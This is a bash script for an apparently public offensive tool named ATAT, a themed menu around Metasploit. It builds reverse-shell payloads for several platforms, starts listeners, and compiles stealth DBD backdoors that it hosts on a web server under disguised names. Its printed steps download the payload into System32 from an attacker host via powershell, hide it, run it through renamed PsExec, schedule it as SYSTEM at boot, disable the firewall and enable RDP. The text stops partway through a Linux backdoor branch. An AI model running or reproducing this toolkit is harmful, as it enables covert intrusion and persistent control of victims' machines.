#!/bin/bash
# ..................
[[ `id -u` -eq 0 ]] || { echo -e "\e[31mMust be root to start your ATAT"; exit 1; }
resize -s 150 150
clear                                   # Clear the screen.
SERVICE=Postgresql;
secs=$(date '+%S');

if service postgresql status | grep -v grep | grep running > /dev/null
then
    echo "$SERVICE service running"
else
    echo "$SERVICE is not running, Starting service." 
    service postgresql start
fi 
SERVICE1=Metasploit;
if ps ax | grep -v grep | grep metasploit > /dev/null
then
    echo "$SERVICE1 service running"
else
    echo "$SERVICE1 is not running, Starting service." 
    service metasploit start
fi 
mkdir ~/Desktop/temp 
clear
clear
echo -e "\E[1;34m==========================================================="
echo -e "\E[1;34m============== \e[97mMetasploit services started \E[1;34m================"
echo -e "\E[1;34m:::::::::::::\e[97mScripts saved to ~/Desktop/temp/\E[1;34m::::::::::::::"
echo -e "\E[1;34m:::::::::::\e[97mPayloads & Results saved to ~/ATAT/\E[1;34m:::::::::::::"
echo -e "\E[1;34m==========================================================="
read -p "Press [Enter] key to Continue..."
clear
echo -e "\E[1;34m======================= \e[97mAttack Team Automation Tool \E[1;34m======================"
if [ 0 -le $secs ] && [ $secs -le 14 ];
then
cat << "EOF"
     _________________________________
    |:::::::::::::;;::::::::::::::::::|
    |:::::::::::'~||~~~``:::::::::::::| 
    |::::::::'   .':     o`:::::::::::|          By |||3N1GmA|||
    |:::::::' oo | |o  o    ::::::::::| 
    |::::::: 8  .'.'    8 o  :::::::::|
    |::::::: 8  | |     8    :::::::::|
    |::::::: _._| |_,...8    :::::::::|
    |::::::'~--.   .--. `.   `::::::::|
    |:::::'     =8     ~  \ o ::::::::| "I Find Your Lack of Faith Disturbing"
    |::::'       8._ 88.   \ o::::::::|
    |:::'   __. ,.ooo~~.    \ o`::::::|
    |:::   . -. 88`78o/:     \  `:::::|        
    |::'     /. o o \ ::      \88`::::|       
    |:;     o|| 8 8 |d.        `8 `:::|       
    |:.       - ^ ^ -'           `-`::|       
    |::.                          .:::|       
    |:::::.....           ::'     ``::|      
    |::::::::-' -        88          `|       
    |:::::-'.          -       ::     |       
    |:-~. . .                   :     |      
    | .. .   ..:   o:8      88o       |       
    |. .     :::   8:P     d888. . .  |       
    |.   .   :88   88      888'  . .  |       
    |   o8  d88P . 88   ' d88P   ..   |       
    |  88P  888   d8P   ' 888         |      
    |   8  d88P.'d:8  .- dP~ o8       | 
    |      888   888    d~ o888       |
    |_________________________________|                          
EOF
elif [ 15 -le $secs ] && [ $secs -le 30 ];
then
cat << "EOF"
                  .?MMMMMMM8$@m-(".-.
                 (MMMMMMMMMMMMMMe(%e9ODA#%eRwC1%%?!-";
                MMMMMMMMMMMMMMMM*%JOMMMMMMMMMMM8M0DC?*%4?".
              .9MMMMMMMMMMMMMMMwe2#MMMMMMRC41%J#M&DC1D8&wM@*M&
             'MMMMMMMMMMMMM0@R9eemMMM#0##M9m**i(%???*i(|1#MRD2
             MMMMMMMMMMM@$449w2C!J%?C%"";"eCw$"|m==||;-`M.
           .MMMMMMMMMDO*i(((||(ii?*1?*%i"=(?mR  1%?(("%!
           mM@MM92e!';"i"?ii(ei;""""";";-(??.
          %MA!!?;"%"="i""mi'-1"""|""=;"""`&(
          .(4?"(=';;"""*9w|.-||(i%%|;`';;.;'
           *eJ;`%("((|i99C|.=|C=!1e;"w......     By ||3N1GmA||
           0m*"1|;"!*(&9me'.-1       M .`..R
           29*"M      -&C(..";       "i .'i%
           #C!%m      MRD"...J        M.;(|.
           @81!9     i&&2;...J=       1;!eiM
          '99*C8     9!"=''`.(%       $A&2"92
          'w=-(?     M%=`.`.e(        AMM*%!.
          CM("A     'OJ%.'.!e         #MMO1w%
          CMA"M.   .MMM%-;'*.         (MMMR0M
         %MMO!wD4 -MMM@%"|"M.        1MMMM8&DJ
         8O1DMMM0w"(!%(*1%"M*       .MM%?AOMMM.
        'R#MMMMMM!24mO91!("=J.      *MMwMMMMMMM
     =C@M0MM@Ae2MMMMMMMA1%"%J4|    %MMMMMMM0@&M?"
   (*M@MMR&&&2C#@#R&&&OC("'.&1='***MMMM#A8&AA1(=(
  ******%(MMMMM@M#OwmJw4A&&i.="2MMM8OwRwCCC1JmD&&$MD   Imperial AT-AT 
EOF
elif [ 31 -le $secs ] && [ $secs -le 45 ];
then
cat << "EOF"
                 ________
            _,.-Y  |  |  Y-._
        .-~"   ||  |  |  |   "-.
        I" ""=="|" !""! "|"[]""|     _____
        L__  [] |..------|:   _[----I" .-{"-.
       I___|  ..| l______|l_ [__L]_[I_/r(=}=-P
      [L______L_[________]______j~  '-=c_]/=-^
       \_I_j.--.\==I|I==_/.--L_]
         [_((==)[`-----"](==)j
            I--I"~~"""~~"I--I
            |[]|         |[]|        By |||3N1GmA|||
            l__j         l__j
            |!!|         |!!|
            |..|         |..|
            ([])         ([])
            ]--[         ]--[
            [_L]         [_L] 
           /|..|\       /|..|\
          `=}--{='     `=}--{='
         .-^--r-^-.   .-^--r-^-.             Imperial AT-AT
EOF
elif [ 46 -le $secs ] && [ $secs -le 57 ];
then
cat << "EOF"
               ._,.
           "..-..pf.
          -L   ..#'
        .+_L  ."]#
        ,'j' .+.j`                 -'.__..,.,p.
       _~ #..<..0.                 .J-.``..._f.
      .7..#_.. _f.                .....-..,`4'
      ;` ,#j.  T'      ..         ..J....,'.j`
     .` .."^.,-0.,,,,yMMMMM,.    ,-.J...+`.j@
    .'.`...' .yMMMMM0M@^=`""g.. .'..J..".'.jH
    j' .'1`  q'^)@@#"^".`"='BNg_...,]_)'...0-
   .T ...I. j"    .'..+,_.'3#MMM0MggCBf....F.
   j/.+'.{..+       `^~'-^~~""""'"""?'"``'1`
   .... .y.}                  `.._-:`_...jf
   g-.  .Lg'                 ..,..'-....,'.
  .'.   .Y^                  .....',].._f    By ||3N1GmA||
  ......-f.                 .-,,.,.-:--&`
                            .`...'..`_J`
                            .~......'#'
                            '..,,.,_]`    
                            .L..`..``. 
EOF
else
cat << "EOF"
     .    .     .            +         .         .                 .  .
      .                 .                   .               .
              .    ,,o         .                  __.o+.
    .            od8^                  .      oo888888P^b           .
       .       ,".o'      .     .             `b^'""`b -`b   .
             ,'.'o'             .   .          t. = -`b -`t.    .
            ; d o' .        ___          _.--.. 8  -  `b  =`b
        .  dooo8<       .o:':__;o.     ,;;o88%%8bb - = `b  =`b.    .
    .     |^88^88=. .,x88/::/ | \\`;;;;;;d%%%%%88%88888/%x88888
          :-88=88%%L8`%`|::|_>-<_||%;;%;8%%=;:::=%8;;\%%%%\8888
      .   |=88 88%%|HHHH|::| >-< |||;%;;8%%=;:::=%8;;;%%%%+|]88        .
          | 88-88%%LL.%.%b::Y_|_Y/%|;;;;`%8%%oo88%:o%.;;;;+|]88  .
          Yx88o88^^'"`^^%8boooood..-\H_Hd%P%%88%P^%%^'\;;;/%%88
         . `"\^\          ~"""""'      d%P """^" ;   = `+' - P
   .        `.`.b   .                :<%%>  .   :  -   d' - P      . .
              .`.b     .        .    `788      ,'-  = d' =.'
       .       ``.b.                           :..-  :'  P
            .   `q.>b         .               `^^^:::::,'       .
                  ""^^               .                     .
  .                        By 3N|GmA          .               .       .
    .         .          .                 .        +         .
EOF
fi 
tput sgr0                                       # 
echo -e "\e[31m_________________________[ \e[97mChoose Your Destiny \e[31m]________________________"
echo -e "\E[1;34m::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e "\E[1;34m===\e[97m[1] \e[90mPayload              \e[97m [Create MSFVenom Payload]  \E[1;34m"
tput sgr0                               # Reset colors to "normal."
echo -e "\E[1;34m:::\e[97m[2] \e[32mListen               \e[97m [Start a Listener]   \E[1;34m"
tput sgr0
echo -e "\E[1;34m===\e[97m[3] \e[34mMsfconsole           \e[97m [Drop into msfconsole]\E[1;34m"
tput sgr0
echo -e "\E[1;34m:::\e[97m[4] \e[95mPersistence          \e[97m [Create a Persistence Method] \E[1;34m"
tput sgr0
echo -e "\E[1;34m===\e[97m[5] \e[31mArmitage             \e[97m [Launch the Armitage GUI]  \E[1;34m"
tput sgr0
echo -e "\E[1;34m:::\e[97m[6] \e[90mMulti-Target Exploit \e[97m [Breach Defenses With Thermal Detonators]   \E[1;34m"
tput sgr0                               # Reset attributes.
echo -e "\E[1;34m===\e[97m[7] \e[32mAuxiliary & Scanning \e[97m [Run Aux Mods & Scans On Many Targets/Ports]  \E[1;34m"
tput sgr0
echo -e "\E[1;34m:::\e[97m[8] \e[34mDependency Checker    \e[97m[Check For Dependencies]   \E[1;34m"
tput sgr0
echo -e "\E[1;34m===\e[97m[9] \e[95mEmpire & DeathStar  \e[97m  [Pledge Your Allegiance to The Empire]   \E[1;34m"
tput sgr0
echo -e "\E[1;34m:::\e[97m[10]\e[31mWireless Attacks      \e[97m[Rule The Airwaves]   \E[1;34m"
tput sgr0
echo -e "\E[1;34m===\e[97m[11]\e[90mPost Exploitation     \e[97m[Loot & Profit]   \E[1;34m"
tput sgr0
echo -e "\E[1;34m:::\e[97m[12]\e[32mMake Your Escape     \e[97m [Float Away...With The Rest Of The Garbage]   \E[1;34m"
tput sgr0
echo -e "\E[1;34m===\e[97m[13]\e[34mPrivilege Escalation  \e[97m[PrivEsc Options & Techniques]   \E[1;34m"
tput sgr0
echo -e "\E[1;34m:::\e[97m[14]\e[95mImperial Research Lab \e[97m[Proof Of Concept Techniques]   \E[1;34m"
tput sgr0
echo -e "\E[1;34m===\e[97m[00]\e[31mReset & Recharge      \e[97m[Wipe All Scan Output To Lock A New Target]  \E[1;34m"
tput sgr0
echo -e "\E[1;34m:::\e[97m[0] \e[90mExit                  \e[97m[Exit ATAT]   \E[1;34m"
tput sgr0

echo -e "\E[1;34m::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e "\e[97m~~~~~~~~~~~~~~~~~~ \e[31mProps to rand0m1ze for the concept!\e[97m~~~~~~~~~~~~~~~~~~\e[31m"
tput sgr0


read options

case "$options" in
# Note variable is quoted.

  "1" | "1" )
  # Accept upper or lowercase input.
  echo -e "\E[1;34m::::: \e[97mChoose Your Weapon \E[1;34m:::::"

PS3='Enter your choice: ENTER=Options Menu | 8=Main Menu | 9=QUIT: '
options=("Windows" "Linux" "Mac" "Android" "List_All" "Custom" "All The Payloads" "Main Menu" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Windows")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f exe > ~/Desktop/temp/shell.exe
            echo -e "\E[1;34m::::: \e[97mshell.exe saved to ~/ATAT/\E[1;34m:::::"
            ;;
        "Linux")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f elf > ~/Desktop/temp/shell.elf
            echo -e "\E[1;34m::::: \e[97mshell.elf saved to ~/ATAT/\E[1;34m:::::"
            ;;
        "Mac")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p osx/x86/shell_reverse_tcp LHOST=$uservar LPORT=$userport -f macho > ~/Desktop/temp/shell.macho
            echo -e "\E[1;34m::::: \e[97mshell.macho saved to ~/ATAT/\E[1;34m:::::"
            ;;
        "Android")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p android/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport R > ~/Desktop/temp/shell.apk
            echo -e "\E[1;34m::::: \e[97mshell.apk saved to ~/ATAT/\E[1;34m:::::"
            ;;  
        "Custom")
cat << "EOF"
<TYPE>:
   + APK
   + ASP
   + ASPX
   + Bash [.sh]
   + Java [.jsp]
   + Linux [.elf]
   + OSX [.macho]
   + Perl [.pl]
   + PHP
   + Powershell [.ps1]
   + Python [.py]
   + Tomcat [.war]
   + Windows [.exe // .dll]

 Rather than putting <DOMAIN/IP>, you can input an interface and ATAT will detect that IP address. 
EOF
            read -p 'Set DOMAIN/IP: ' userhost; read -p 'Set LPORT: ' userport; read -p 'Set TYPE: ' usertype; read -p 'Select CMD/MSF: ' usershell; read -p 'Set BIND/REVERSE: ' userbindrev; read -p 'Set STAGED/STAGELESS: ' userstage; read -p 'Select TCP/HTTP/HTTPS/FIND_PORT: ' userprotocol; read -p 'Select BATCH/LOOP (optional): ' usermode
            /usr/bin/msfpc $usertype $userhost $userport $usershell $userbindrev $userstage $userprotocol $usermode verbose
            echo -e "\E[1;34m::::: \e[97mPayload & RC File Saved to ~/ATAT/\E[1;34m:::::"
            ;;
        "All The Payloads")
            read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport
            /usr/bin/msfpc verbose loop $userhost $userport
            echo -e "\E[1;34m::::: \e[97mPayloads & RC Files Saved to ~/ATAT/\E[1;34m:::::"
            ;;
        "List_All")
            rm msfvenom_payloads.txt
            msfvenom -l | tee msfvenom_payloads.txt
            echo -e "\E[1;34m::::: \e[97mmsfvenom_payloads.txt Saved to ~/ATAT/\E[1;34m:::::"
            ;;   
        "Main Menu")
            ~/ATAT/ATAT.sh
            ;;
        "Quit")
            echo "Aufiederszehn" && exit 1
            ;;
        *) echo invalid option;;
    esac
done
 ;;

  "2" | "2" )
echo -e "\E[1;34m::::: \e[97mCreate a Listener \E[1;34m:::::"
echo ""
echo -e "\E[1;34m::::: \e[97mChoose XTerm If You Are Not Sure Which Terminal You Have \E[1;34m:::::"
echo -e "\E[1;34m::::: \e[97mDO NOT Use Ctrl-C to Close ATAT After Starting A Listener!!! \E[1;34m:::::"
PS3='Enter your choice: ENTER=Options Menu | 6=Main Menu | 7=QUIT: '
options=("XTerm" "Mate-Terminal" "Gnome-Terminal" "Xfce4" "LXTerminal" "Main Menu" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "XTerm")
        read -p 'Set LPORT: ' userport; read -p 'Set PAYLOAD: ' userpayload
            touch ~/Desktop/temp/meterpreter.rc
            echo use exploit/multi/handler > ~/Desktop/temp/meterpreter.rc
            echo set PAYLOAD $userpayload >> ~/Desktop/temp/meterpreter.rc
            echo set LHOST 0.0.0.0 >> ~/Desktop/temp/meterpreter.rc
            echo set LPORT $userport >> ~/Desktop/temp/meterpreter.rc
            echo set ExitOnSession false >> ~/Desktop/temp/meterpreter.rc
#           echo set AutoRunScript post/multi/gather/multi_command RESOURCE=/root/ATAT/postex.rc >> ~/Desktop/temp/meterpreter.rc
#           echo set AutoRunScript /root/ATAT/ATAT_multi_post.rc >> ~/Desktop/temp/meterpreter.rc
            echo exploit -j >> ~/Desktop/temp/meterpreter.rc
            cat ~/Desktop/temp/meterpreter.rc
            xterm -e msfconsole -q -r ~/Desktop/temp/meterpreter.rc &
            ;;
        "Mate-Terminal")
        read -p 'Set LPORT: ' userport; read -p 'Set PAYLOAD: ' userpayload
            touch ~/Desktop/temp/meterpreter1.rc
            echo use exploit/multi/handler > ~/Desktop/temp/meterpreter1.rc
            echo set PAYLOAD $userpayload >> ~/Desktop/temp/meterpreter1.rc
            echo set LHOST 0.0.0.0 >> ~/Desktop/temp/meterpreter1.rc
            echo set LPORT $userport >> ~/Desktop/temp/meterpreter1.rc
            echo set ExitOnSession false >> ~/Desktop/temp/meterpreter1.rc
            echo exploit -j >> ~/Desktop/temp/meterpreter1.rc
            cat ~/Desktop/temp/meterpreter1.rc
            mate-terminal -e "bash -c \"msfconsole -q -r ~/Desktop/temp/meterpreter1.rc\"" &
            ;;
        "Gnome-Terminal")
        read -p 'Set LPORT: ' userport; read -p 'Set PAYLOAD: ' userpayload
            touch ~/Desktop/temp/meterpreter2.rc
            echo use exploit/multi/handler > ~/Desktop/temp/meterpreter2.rc
            echo set PAYLOAD $userpayload >> ~/Desktop/temp/meterpreter2.rc
            echo set LHOST 0.0.0.0 >> ~/Desktop/temp/meterpreter2.rc
            echo set LPORT $userport >> ~/Desktop/temp/meterpreter2.rc
            echo set ExitOnSession false >> ~/Desktop/temp/meterpreter2.rc
            echo exploit -j >> ~/Desktop/temp/meterpreter2.rc
            cat ~/Desktop/temp/meterpreter2.rc
            gnome-terminal -e "bash -c \"msfconsole -q -r ~/Desktop/temp/meterpreter2.rc\"" &
            ;;
        "Xfce4")
        read -p 'Set LPORT: ' userport; read -p 'Set PAYLOAD: ' userpayload
            touch ~/Desktop/temp/meterpreter3.rc
            echo use exploit/multi/handler > ~/Desktop/temp/meterpreter3.rc
            echo set PAYLOAD $userpayload >> ~/Desktop/temp/meterpreter3.rc
            echo set LHOST 0.0.0.0 >> ~/Desktop/temp/meterpreter3.rc
            echo set LPORT $userport >> ~/Desktop/temp/meterpreter3.rc
            echo set ExitOnSession false >> ~/Desktop/temp/meterpreter3.rc
            echo exploit -j >> ~/Desktop/temp/meterpreter3.rc
            cat ~/Desktop/temp/meterpreter3.rc
            xfce4-terminal -e "bash -c \"msfconsole -q -r ~/Desktop/temp/meterpreter3.rc\"" &
            ;;
        "LXTerminal")
        read -p 'Set LPORT: ' userport; read -p 'Set PAYLOAD: ' userpayload
            touch ~/Desktop/temp/meterpreter4.rc
            echo use exploit/multi/handler > ~/Desktop/temp/meterpreter4.rc
            echo set PAYLOAD $userpayload >> ~/Desktop/temp/meterpreter4.rc
            echo set LHOST 0.0.0.0 >> ~/Desktop/temp/meterpreter4.rc
            echo set LPORT $userport >> ~/Desktop/temp/meterpreter4.rc
            echo set ExitOnSession false >> ~/Desktop/temp/meterpreter4.rc
            echo exploit -j >> ~/Desktop/temp/meterpreter4.rc
            cat ~/Desktop/temp/meterpreter4.rc
            lxterminal -e "bash -c \"msfconsole -q -r ~/Desktop/temp/meterpreter4.rc\"" &
            ;;
        "Main Menu")
            ~/ATAT/ATAT.sh
            ;;
        "Quit")
            echo "Aufiederszehn" && exit 1
            ;;
        *) echo invalid option;;
    esac
done
;;

  "3" | "3" )
  # Accept upper or lowercase input.
  echo -e "\E[1;34m::::: \e[97mStarting Metasploit \E[1;34m:::::"
  msfconsole

;;

  "4" | "4" )
# Accept upper or lowercase input.
echo -e "\E[1;34m::::: \e[97mPersistence Generator \E[1;34m:::::"
echo -e "\E[1;34m::::: \e[97mBind Shells are a Work in Progress \E[1;34m:::::"
echo -e "\E[1;34m::::: \e[97mThanks to Skysploit for the DBD Builder!! \E[1;34m:::::"
PS3='Enter your choice: ENTER=Options Menu | 9=Main Menu | 10=QUIT: '
options=("Windows DBD Reverse Shell" "Windows DBD Bind Shell" "Linux/NetBSD/FreeBSD/OpenBSD DBD Reverse Shell" "Linux/NetBSD/FreeBSD/OpenBSD DBD Bind Shell" "DBD Reboot Persistence Generator - Windows" "Configure C2 Server For Persistent SSH Session" "Persistent SSH Session Generator" "Android" "Main Menu" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Windows DBD Reverse Shell")
		clear
		read -p "Where shall I send your persistent shell? (LHOST)" attackerip
		echo ""
		read -p "What port will you be listening on? (LPORT)" attackerport
		echo ""
		read -p "What would you like the shared secret to be on your secure connection? " attackersecret
		echo ""
		echo -e "\e[1;34mGenerating your payload...\e[0m"
		echo ""
		sed "/HOST/s/attackerip/$attackerip/g" ~/ATAT/misc/dbd/conf/dbd_win_reverse.conf > ~/ATAT/misc/dbd/dbd_win_reverse1.conf
		sed "/PORT/s/attackerport/$attackerport/g" ~/ATAT/misc/dbd/dbd_win_reverse1.conf > ~/ATAT/misc/dbd/dbd_win_reverse2.conf
		sed "/SHARED_SECRET/s/attackersecret/$attackersecret/g" ~/ATAT/misc/dbd/dbd_win_reverse2.conf > ~/ATAT/misc/dbd/dbd.h
		rm ~/ATAT/misc/dbd/dbd_win_reverse1.conf
		rm ~/ATAT/misc/dbd/dbd_win_reverse2.conf
		cd ~/ATAT/misc/dbd/
		make mingw-cross CFLAGS=-DSTEALTH
		cp ~/ATAT/misc/dbd/dbd.exe /var/www/html/winmgnt.txt
		cp ~/ATAT/taskmgnt.txt /var/www/html/taskmgnt.txt
		chown www-data:www-data /var/www/html/winmgnt.txt
		chown www-data:www-data /var/www/html/taskmgnt.txt
		clear
		#rm dbd.exe
		SERVICE=Apache;
	secs=$(date '+%S');
	if service apache2 status | grep -v grep | grep running > /dev/null
	then
		echo "$SERVICE service running"
	else
		echo "$SERVICE is not running, Starting service." 
		service apache2 start
	fi  
		cd ~/ATAT
		echo -e "\E[1;34m\e[97m \e[31mStarting Apache server to host payloads...\e[97m\E[1;34m"
		echo -e "\e[1;34mDone! Your payload is located at /var/www/html/winmgnt.txt (change to EXE for manual deployment)\e[0m"
		echo ""
		
		read -p "Would you like me to launch a listener [y|n]? " listener
		echo ""
		
			if [ "$listener" == "y" ]; then
				x-terminal-emulator -e dbd -lvp $attackerport -k $attackersecret &
				read -p "Press any key to contiue" enter
				clear				
			else
				echo -e "\e[1;34mWhen you are ready to receive your shell in your terminal enter:\e[0m"
				echo "dbd -lvp $attackerport -k $attackersecret"
				echo ""
				read -p "Press any key to contiue" enter
				clear
			fi
		echo "While this backdoor is self healing; it will not auto start at reboot."
		echo "To get your shell back after a reboot, open the firewall, & enable RDP, enter the following on the target (commands in RED, one command per line):"
		echo ""
		echo "INSTRUCTIONS FROM A WINDOWS TERMINAL SHELL:"
		echo -e "\E[1;34m\e[97m \e[31mnetsh firewall set opmode disable\e[97m - This disables the firewall totally (optional depending on target/goals)\E[1;34m"
		echo -e "\E[1;34m\e[97m \e[31mreg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\e[97m- This enables RDP, step 1 (optional depending on target/goals)\E[1;34m"
		echo -e "\E[1;34m\e[97m \e[31mreg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fAllowToGetHelp /t REG_WORD /d 1 /f\e[97m - This enables RDP, step 2 (optional depending on target/goals)\E[1;34m"
		echo ""
		echo "Now move the \"taskmgnt.txt\" & \"winmgnt.txt\" files to the target, rename & hide them, then launch backdoor with MS signed ofuscated PsExec. Run the first 3 delete & kill commands to remove the files first; only if you have already moved them to the target and you wish to re-run this process."
		echo -e "\E[1;34m\e[97m \e[31mdel /A:H \"%WINDIR%\\System32\\\taskmgnt.exe\"\e[97m\E[1;34m"
		echo -e "\E[1;34m\e[97m \e[31mtaskkill /F /IM winmgnt.exe\e[97m\E[1;34m"
		echo -e "\E[1;34m\e[97m \e[31mdel /A:H \"%WINDIR%\\System32\\winmgnt.exe\"\e[97m\E[1;34m"
		echo ""
		echo -e "\E[1;34m\e[97m \e[31mpowershell (new-object System.Net.WebClient).DownloadFile('http://<ATTACKER_IPADDRESS>/winmgnt.txt','%WINDIR%\System32\winmgnt.exe')\e[97m\E[1;34m"
		echo ""
		echo -e "\E[1;34m\e[97m \e[31mpowershell (new-object System.Net.WebClient).DownloadFile('http://<ATTACKER_IPADDRESS>/taskmgnt.txt','%WINDIR%\System32\\\taskmgnt.exe')\e[97m\E[1;34m"
		echo ""
		echo -e "\E[1;34m\e[97m \e[31mattrib +H +S \"%WINDIR%\System32\winmgnt.exe\"\e[97m\E[1;34m"
		echo ""
		echo -e "\E[1;34m\e[97m \e[31mattrib +H +S \"%WINDIR%\System32\\\taskmgnt.exe\"\e[97m\E[1;34m"
		echo ""
		echo -e "\E[1;34m\e[97m \e[31m%WINDIR%\System32\\\taskmgnt.exe -i -d -s /accepteula %WINDIR%\System32\winmgnt.exe\e[97m\E[1;34m"
		echo ""
		echo -e "\E[1;34m\e[97m \e[31mschtasks /create /sc onstart /tn WindowsMgr /rl highest /ru SYSTEM /tr \"%WINDIR%\System32\winmgnt.exe\"\e[97m\E[1;34m"
        echo ""
        echo "INSTRUCTIONS FROM A METERPRETER SHELL:"
        echo -e "\E[1;34m\e[97mmeterpreter > \e[31mupload '/root/ATAT/DBD_reboot.bat' %WINDIR%\\\\\System32\\\\\DBD_reboot.bat\e[97m\E[1;34m"
        echo -e "\E[1;34m\e[97mmeterpreter > \e[31mshell\e[97m\E[1;34m"
        echo "Now from the Windows Terminal:"
        echo -e "\E[1;34m\e[97m \e[31mcd\windows\system32\e[97m\E[1;34m"
        echo -e "\E[1;34m\e[97m \e[31mDBD_reboot.bat\e[97m\E[1;34m"
            ;;
       "Windows DBD Bind Shell")
        read -p "What port would you like the victim be listening on? (RPORT)" attackerport
		echo ""
		read -p "What would you like the shared secret to be on your secure connection? " attackersecret
		echo ""
		echo -e "\e[1;34mGenerating your payload...\e[0m"
		echo ""
		sleep 3
		sed "/PORT/s/attackerport/$attackerport/g" ~/ATAT/misc/dbd/conf/dbd_win_bind.conf > ~/ATAT/misc/dbd/dbd_win_bind1.conf
		sed "/SHARED_SECRET/s/attackersecret/$attackersecret/g" ~/ATAT/misc/dbd/dbd_win_bind1.conf > ~/ATAT/misc/dbd/dbd.h
		rm ~/ATAT/misc/dbd/dbd_win_bind1.conf
		cd ~/ATAT/misc/dbd/
		make mingw-cross CFLAGS=-DSTEALTH
		cp ~/ATAT/misc/dbd/dbd.exe /var/www/html/winmgnt.txt
		cp ~/ATAT/taskmgnt.txt /var/www/html/taskmgnt.txt
		chown www-data:www-data /var/www/html/winmgnt.txt
		chown www-data:www-data /var/www/html/taskmgnt.txt
		clear
		#rm dbd.exe
		SERVICE=Apache;
	secs=$(date '+%S');
	if service apache2 status | grep -v grep | grep running > /dev/null
	then
		echo "$SERVICE service running"
	else
		echo "$SERVICE is not running, Starting service." 
		service apache2 start
	fi  
		cd ~/ATAT
		echo -e "\E[1;34m\e[97m \e[31mStarting Apache server to host payloads...\e[97m\E[1;34m"
		echo -e "\e[1;34mDone! Your payload is located at /var/www/html/winmgnt.txt (change to EXE for manual deployment)\e[0m"
		echo ""
		echo -e "\e[1;34mWhen you are ready to connect to the victim, in your terminal enter:\e[0m"
		echo "dbd -nv victim.host.orip -p $attackerport -k $attackersecret"
		echo ""
		read -p "Press any key to contiue" enter
		clear
		echo "While this backdoor is self healing; it will not auto start at reboot."
		echo "To get your shell back after a reboot, open the firewall, & enable RDP, enter the following on the target (commands in RED, one command per line):"
		echo ""
		echo "INSTRUCTIONS FROM A WINDOWS TERMINAL SHELL:"
		echo -e "\E[1;34m\e[97m \e[31mnetsh firewall set opmode disable\e[97m - This disables the firewall totally (optional depending on target/goals)\E[1;34m"
		echo -e "\E[1;34m\e[97m \e[31mreg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\e[97m- This enables RDP, step 1 (optional depending on target/goals)\E[1;34m"
		echo -e "\E[1;34m\e[97m \e[31mreg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fAllowToGetHelp /t REG_WORD /d 1 /f\e[97m - This enables RDP, step 2 (optional depending on target/goals)\E[1;34m"
		echo ""
		echo "Now move the \"taskmgnt.txt\" & \"winmgnt.txt\" files to the target, rename & hide them, then launch backdoor with MS signed ofuscated PsExec. Run the first 3 delete & kill commands to remove the files first; only if you have already moved them to the target and you wish to re-run this process."
		echo -e "\E[1;34m\e[97m \e[31mdel /A:H \"%WINDIR%\\System32\\\taskmgnt.exe\"\e[97m\E[1;34m"
		echo -e "\E[1;34m\e[97m \e[31mtaskkill /F /IM winmgnt.exe\e[97m\E[1;34m"
		echo -e "\E[1;34m\e[97m \e[31mdel /A:H \"%WINDIR%\\System32\\winmgnt.exe\"\e[97m\E[1;34m"
		echo ""
		echo -e "\E[1;34m\e[97m \e[31mpowershell (new-object System.Net.WebClient).DownloadFile('http://<ATTACKER_IPADDRESS>/winmgnt.txt','%WINDIR%\System32\winmgnt.exe')\e[97m\E[1;34m"
		echo ""
		echo -e "\E[1;34m\e[97m \e[31mpowershell (new-object System.Net.WebClient).DownloadFile('http://<ATTACKER_IPADDRESS>/taskmgnt.txt','%WINDIR%\System32\\\taskmgnt.exe')\e[97m\E[1;34m"
		echo ""
		echo -e "\E[1;34m\e[97m \e[31mattrib +H +S \"%WINDIR%\System32\winmgnt.exe\"\e[97m\E[1;34m"
		echo ""
		echo -e "\E[1;34m\e[97m \e[31mattrib +H +S \"%WINDIR%\System32\\\taskmgnt.exe\"\e[97m\E[1;34m"
		echo ""
		echo -e "\E[1;34m\e[97m \e[31m%WINDIR%\System32\\\taskmgnt.exe -i -d -s /accepteula %WINDIR%\System32\winmgnt.exe\e[97m\E[1;34m"
		echo ""
		echo -e "\E[1;34m\e[97m \e[31mschtasks /create /sc onstart /tn WindowsMgr /rl highest /ru SYSTEM /tr \"%WINDIR%\System32\winmgnt.exe\"\e[97m\E[1;34m"
        echo ""
        echo "INSTRUCTIONS FROM A METERPRETER SHELL:"
        echo -e "\E[1;34m\e[97mmeterpreter > \e[31mupload '/root/ATAT/DBD_reboot.bat' %WINDIR%\\\\\System32\\\\\DBD_reboot.bat\e[97m\E[1;34m"
        echo -e "\E[1;34m\e[97mmeterpreter > \e[31mshell\e[97m\E[1;34m"
        echo "Now from the Windows Terminal:"
        echo -e "\E[1;34m\e[97m \e[31mcd\windows\system32\e[97m\E[1;34m"
        echo -e "\E[1;34m\e[97m \e[31mDBD_reboot.bat\e[97m\E[1;34m"
            ;;
        "Linux/NetBSD/FreeBSD/OpenBSD DBD Reverse Shell")	
		clear
		read -p "Where shall I send your persistent shell? (LHOST)" attackerip
		echo ""
		read -p "What port will you be listening on? (LPORT)" attackerport
		echo ""
		read -p "What would you like the shared secret to be on your secure connection? " attackersecret
		echo ""
		echo -e "\e[1;34mGenerating your payload...\e[0m"
		echo ""
		sleep 3
		sed "/HOST/s/attackerip/$attackerip/g" ~/ATAT/misc/dbd/conf/dbd_unix_reverse.conf > ~/ATAT/misc/dbd/dbd_unix_reverse1.conf
